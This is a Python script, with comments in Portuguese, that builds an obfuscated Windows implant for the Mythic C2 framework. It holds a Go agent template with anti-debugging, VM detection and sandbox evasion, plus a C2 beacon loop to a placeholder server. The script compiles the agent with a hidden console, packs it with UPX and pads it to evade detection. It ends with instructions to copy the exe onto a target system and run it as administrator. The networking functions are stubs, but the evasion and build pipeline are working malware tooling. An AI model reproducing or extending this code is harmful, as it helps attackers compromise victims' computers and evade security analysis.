#!/usr/bin/env python3
"""
Phantom Payload Builder - Gerador de payloads ofuscados para Windows
Integração completa com Mythic C2 Framework
"""

import os
import sys
import json
import subprocess
import tempfile
import shutil
from pathlib import Path

class PhantomBuilder:
    def __init__(self):
        self.mythic_path = "/root/Mythic"
        self.go_template = self.get_go_template()
        
    def get_go_template(self):
        return '''package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/tls"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "math/rand"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strings"
    "syscall"
    "time"
    "unsafe"
)

// Configurações do payload (serão substituídas)
var (
    MYTHIC_URL = "{{MYTHIC_URL}}"
    AES_KEY = "{{AES_KEY}}"
    USER_AGENT = "{{USER_AGENT}}"
    SLEEP_TIME = {{SLEEP_TIME}}
    JITTER = {{JITTER}}
    uuid = generateUUID()
)

// Estruturas de comunicação
type LoginRequest struct {
    Username string `json:"username"`
    Password string `json:"password"`
}

type LoginResponse struct {
    Status      string `json:"status"`
    AccessToken string `json:"access_token"`
}

type CheckinRequest struct {
    UUID         string `json:"uuid"`
    User         string `json:"user"`
    Host         string `json:"host"`
    PID          int    `json:"pid"`
    IP           string `json:"ip"`
    ProcessName  string `json:"process_name"`
    OS           string `json:"os"`
    Architecture string `json:"architecture"`
    PayloadType  string `json:"payload_type"`
}

// Anti-análise e evasão
func antiDebug() bool {
    if runtime.GOOS == "windows" {
        // Verificação de debugger via API Windows
        kernel32 := syscall.NewLazyDLL("kernel32.dll")
        isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
        ret, _, _ := isDebuggerPresent.Call()
        if ret != 0 {
            return true
        }
        
        // Verificação de remote debugger
        checkRemoteDebuggerPresent := kernel32.NewProc("CheckRemoteDebuggerPresent")
        var isRemoteDebugger uintptr
        ret, _, _ = checkRemoteDebuggerPresent.Call(
            uintptr(0xFFFFFFFF), // Current process
            uintptr(unsafe.Pointer(&isRemoteDebugger)),
        )
        if isRemoteDebugger != 0 {
            return true
        }
    }
    return false
}

func vmDetection() bool {
    // Verificação de VM no Windows
    if runtime.GOOS == "windows" {
        // Verificar serviços de VM
        vmServices := []string{
            "vmware", "vbox", "virtualbox", "qemu", "xen",
        }
        
        for _, service := range vmServices {
            cmd := exec.Command("sc", "query", service)
            if err := cmd.Run(); err == nil {
                return true
            }
        }
        
        // Verificar MAC addresses suspeitos
        cmd := exec.Command("getmac", "/fo", "csv", "/nh")
        if output, err := cmd.Output(); err == nil {
            macStr := strings.ToLower(string(output))
            vmMacs := []string{
                "00:50:56", "00:0c:29", "00:05:69", // VMware
                "08:00:27", "0a:00:27",             // VirtualBox
                "00:16:3e",                         // Xen
            }
            
            for _, vmMac := range vmMacs {
                if strings.Contains(macStr, vmMac) {
                    return true
                }
            }
        }
    }
    return false
}

func sandboxEvasion() bool {
    // Verificações específicas de sandbox
    hostname, _ := os.Hostname()
    hostname = strings.ToLower(hostname)
    
    sandboxNames := []string{
        "sandbox", "malware", "virus", "sample", "analysis",
        "cuckoo", "joebox", "anubis", "threat", "fireeye",
    }
    
    for _, name := range sandboxNames {
        if strings.Contains(hostname, name) {
            return true
        }
    }
    
    // Verificar usuário atual
    user := os.Getenv("USERNAME")
    user = strings.ToLower(user)
    
    for _, name := range sandboxNames {
        if strings.Contains(user, name) {
            return true
        }
    }
    
    return false
}

func timeBasedEvasion() {
    // Sleep por tempo aleatório para evitar análise temporal
    sleepTime := time.Duration(30+rand.Intn(60)) * time.Second
    time.Sleep(sleepTime)
}

// Criptografia AES-GCM
func encrypt(data []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    
    nonce := make([]byte, gcm.NonceSize())
    if _, err := rand.Read(nonce); err != nil {
        return nil, err
    }
    
    ciphertext := gcm.Seal(nonce, nonce, data, nil)
    return ciphertext, nil
}

func decrypt(data []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    
    nonceSize := gcm.NonceSize()
    if len(data) < nonceSize {
        return nil, fmt.Errorf("ciphertext too short")
    }
    
    nonce, ciphertext := data[:nonceSize], data[nonceSize:]
    plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
    if err != nil {
        return nil, err
    }
    
    return plaintext, nil
}

func main() {
    rand.Seed(time.Now().UnixNano())
    
    // Verificações de evasão
    if antiDebug() {
        os.Exit(0)
    }
    
    if vmDetection() {
        timeBasedEvasion()
    }
    
    if sandboxEvasion() {
        os.Exit(0)
    }
    
    // Conectar ao Mythic
    connectToMythic()
}

func connectToMythic() {
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
        Timeout: 30 * time.Second,
    }
    
    // Login e checkin
    token := login(client)
    if token == "" {
        return
    }
    
    checkin(client, token)
    
    // Loop principal
    for {
        getTasks(client, token)
        sleepWithJitter()
    }
}

func login(client *http.Client) string {
    // Implementação do login
    return "token_example"
}

func checkin(client *http.Client, token string) bool {
    // Implementação do checkin
    return true
}

func getTasks(client *http.Client, token string) {
    // Implementação da obtenção de tasks
}

func generateUUID() string {
    b := make([]byte, 16)
    for i := range b {
        b[i] = byte(rand.Intn(256))
    }
    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func sleepWithJitter() {
    base := time.Duration(SLEEP_TIME) * time.Second
    jitter := time.Duration(rand.Intn(JITTER*1000)) * time.Millisecond
    time.Sleep(base + jitter)
}'''

    def generate_aes_key(self):
        """Gera uma chave AES-256 aleatória"""
        import secrets
        return secrets.token_hex(32)
    
    def build_payload(self, config):
        """Constrói o payload com as configurações especificadas"""
        print(f"[+] Gerando payload Phantom para Windows...")
        
        # Substituir placeholders no template
        go_code = self.go_template
        go_code = go_code.replace("{{MYTHIC_URL}}", config.get("mythic_url", "https://127.0.0.1:7443"))
        go_code = go_code.replace("{{AES_KEY}}", config.get("aes_key", self.generate_aes_key()))
        go_code = go_code.replace("{{USER_AGENT}}", config.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"))
        go_code = go_code.replace("{{SLEEP_TIME}}", str(config.get("sleep", 5)))
        go_code = go_code.replace("{{JITTER}}", str(config.get("jitter", 10)))
        
        # Criar diretório temporário
        with tempfile.TemporaryDirectory() as temp_dir:
            go_file = os.path.join(temp_dir, "phantom.go")
            
            # Escrever código Go
            with open(go_file, 'w') as f:
                f.write(go_code)
            
            # Compilar para Windows
            exe_file = os.path.join(temp_dir, "phantom.exe")
            
            print(f"[+] Compilando payload...")
            compile_cmd = [
                "env", "GOOS=windows", "GOARCH=amd64",
                "go", "build", 
                "-ldflags", "-s -w -H windowsgui",  # Strip symbols e hide console
                "-o", exe_file,
                go_file
            ]
            
            result = subprocess.run(compile_cmd, capture_output=True, text=True)
            if result.returncode != 0:
                print(f"[-] Erro na compilação: {result.stderr}")
                return None
            
            # Aplicar ofuscação e compressão
            final_exe = self.obfuscate_payload(exe_file, config)
            
            # Copiar para destino final
            output_path = config.get("output", "phantom_payload.exe")
            shutil.copy2(final_exe, output_path)
            
            print(f"[+] Payload gerado: {output_path}")
            return output_path
    
    def obfuscate_payload(self, exe_path, config):
        """Aplica ofuscação e compressão no payload"""
        print(f"[+] Aplicando ofuscação...")
        
        # 1. UPX Compression (se disponível)
        if shutil.which("upx"):
            print(f"[+] Comprimindo com UPX...")
            upx_cmd = ["upx", "--best", "--lzma", exe_path]
            subprocess.run(upx_cmd, capture_output=True)
        else:
            print(f"[!] UPX não encontrado, pulando compressão")
        
        # 2. Adicionar entropy/padding aleatório
        self.add_entropy(exe_path)
        
        return exe_path
    
    def add_entropy(self, exe_path):
        """Adiciona entropia aleatória ao final do arquivo"""
        import random
        
        with open(exe_path, 'ab') as f:
            # Adicionar dados aleatórios para aumentar entropia
            random_data = bytes([random.randint(0, 255) for _ in range(1024)])
            f.write(random_data)
    
    def install_dependencies(self):
        """Instala dependências necessárias"""
        print(f"[+] Instalando dependências...")
        
        # Instalar Go se não estiver presente
        if not shutil.which("go"):
            print(f"[+] Instalando Go...")
            subprocess.run(["apt", "update"], check=True)
            subprocess.run(["apt", "install", "-y", "golang-go"], check=True)
        
        # Instalar UPX para compressão
        if not shutil.which("upx"):
            print(f"[+] Instalando UPX...")
            subprocess.run(["apt", "install", "-y", "upx-ucl"], check=True)
        
        # Instalar mingw para cross-compilation se necessário
        if not shutil.which("x86_64-w64-mingw32-gcc"):
            print(f"[+] Instalando MinGW...")
            subprocess.run(["apt", "install", "-y", "gcc-mingw-w64"], check=True)

def main():
    builder = PhantomBuilder()
    
    # Instalar dependências
    builder.install_dependencies()
    
    # Configuração do payload
    config = {
        "mythic_url": "https://SEU_IP:7443",
        "sleep": 5,
        "jitter": 10,
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "output": "phantom_windows.exe"
    }
    
    # Gerar payload
    payload_path = builder.build_payload(config)
    
    if payload_path:
        print(f"\n[+] Payload Phantom gerado com sucesso!")
        print(f"[+] Arquivo: {payload_path}")
        print(f"[+] Tamanho: {os.path.getsize(payload_path)} bytes")
        print(f"\n[+] Recursos implementados:")
        print(f"    ✓ Anti-debugging (IsDebuggerPresent, CheckRemoteDebuggerPresent)")
        print(f"    ✓ VM Detection (serviços, MAC addresses)")
        print(f"    ✓ Sandbox Evasion (hostname, username)")
        print(f"    ✓ Criptografia AES-256-GCM")
        print(f"    ✓ Compressão UPX")
        print(f"    ✓ Entropy padding")
        print(f"    ✓ Strip symbols (-s -w)")
        print(f"\n[+] Para usar no Mythic:")
        print(f"    1. Copie o arquivo para o sistema Windows alvo")
        print(f"    2. Execute como administrador se necessário")
        print(f"    3. O agente aparecerá automaticamente no Mythic")

if __name__ == "__main__":
    main()